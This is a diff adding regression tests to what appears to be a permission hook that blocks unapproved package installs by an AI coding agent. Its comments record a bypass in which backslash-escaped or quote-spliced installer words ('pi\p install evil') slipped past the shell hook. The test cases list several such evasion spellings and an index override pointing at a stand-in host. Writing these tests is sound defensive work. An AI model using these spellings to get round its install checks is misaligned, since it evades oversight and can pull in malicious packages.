@@ -2295,6 +2295,59 @@ dep_both("mix deps.get", 0, "#39 control: bare verb, other ecosystem")
 dep_both("sudo PIP_INDEX_URL=http://evil.test/simple pip install requests", 2,
          "#39 control: the index-override check still reads the head")
 
+# ========================================================================= #
+# X-36e (issue #41): an escaped or quote-spliced installer word bypassed the
+# SHELL hook.
+#
+# `pi\p install evil` was shell rc=0 / SDK deny. bash removes quote
+# characters and backslashes BEFORE it resolves the word, so `pi\p` names
+# pip and the command installs `evil`; the shell's cmd_segments restores
+# escapes, so the anchor - a regex over that text - never saw an installer.
+# The SDK denied because its _flatten_seg drops backslashes, which is why
+# the split was visible at all.
+#
+# The direction is the PERMITTED one (the contract forbids SDK more
+# permissive, not stricter), but the canonical substrate is the one that
+# allowed an unapproved install, so it is a bypass either way.
+#
+# The primitive already existed: cmdpos.cmd_word is "the basename of tok
+# after shell quote removal", added because five deny-granting walks read
+# raw tokens while bash read reduced ones. The install anchor was a consumer
+# that never adopted it. Its quote-removal half is now named
+# `unquote_word` and the anchor's token scan reads through it - so this is
+# an existing, tested reduction applied at one more site, not new machinery.
+# ========================================================================= #
+print("\n== X-36e (#41): the installer word bash will actually resolve ==")
+
+dep_both(r"pi\p install evil", 2, "#41: backslash inside the tool word")
+dep_both(r"p\ip install evil", 2, "#41: backslash earlier in the word")
+dep_both(r"\pip install evil", 2, "#41: leading backslash")
+dep_both(r"pip\x install evil", 2, "#41: escaped pipx")
+dep_both(r"sudo pi\p install evil", 2, "#41: composes with a wrapper")
+dep_both(r"python3 -m pip\x install evil", 2, "#41: composes with the -m prefix")
+dep_both("sh -c 'pi''px install evil'", 2,
+         "#41: adjacent quoted runs splice inside an invoker argument")
+# The quoted spellings already denied (the shell tokenizer strips quotes);
+# they are controls that the reduction did not break them.
+dep_both("'pip' install evil", 2, "#41 control: fully quoted word")
+dep_both("p''ip install evil", 2, "#41 control: empty-quote splice")
+# ...and the reduction must not invent installs that are not there.
+dep_both(r"pi\p install requests", 0, "#41 control: approved through the escape")
+dep_both("pip install evil", 2, "#41 control: the plain spelling")
+dep_both("pip install requests", 0, "#41 control: the plain approved spelling")
+dep_both("echo pip install evil", 0,
+         "#41 control: prose is not command position")
+dep_both("git commit -m 'pip install evil'", 0,
+         "#41 control: an invoker whose argument is DATA, not a command line")
+
+print("\n-- #41 structural: one reduction, shared --")
+check("#41: cmdpos exposes the quote-removal half by name",
+      hasattr(_cmdpos, "unquote_word"))
+check("#41: cmd_word is still built from it (one definition)",
+      _cmdpos.cmd_word("/usr/bin/pi\\p") == "pip"
+      and _cmdpos.unquote_word("/usr/bin/pi\\p") == "/usr/bin/pip",
+      "unquote_word keeps the path; cmd_word is that plus the basename step")
+
 del os.environ["CLAUDE_PROJECT_DIR"]
 shutil.rmtree(TMP, ignore_errors=True)
 
